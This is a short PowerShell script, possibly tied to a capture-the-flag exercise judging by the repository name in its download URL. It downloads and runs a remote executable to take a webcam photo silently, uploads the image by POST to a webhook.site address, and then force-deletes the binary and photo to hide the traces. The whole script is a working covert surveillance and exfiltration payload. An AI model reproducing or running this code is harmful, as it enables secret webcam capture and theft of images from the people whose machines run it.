$ffmpegUrl = "https://github.com/Hackering-True/simplecalc-ctf/ffmpeg.exe"
$ffmpegPath = "$env:TEMP\ffmpeg.exe"
$photoPath = "$env:TEMP\photo.jpg"

Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegPath
Start-Process -FilePath $ffmpegPath -ArgumentList "-f dshow -i video=`"Integrated Camera`" -frames:v 1 $photoPath" -Wait -NoNewWindow

Invoke-WebRequest -Uri "https://webhook.site/b620ae52-906d-433a-a17c-8cd91ef5e1ae" -Method POST -InFile $photoPath -UseBasicParsing

Remove-Item $ffmpegPath, $photoPath -Force
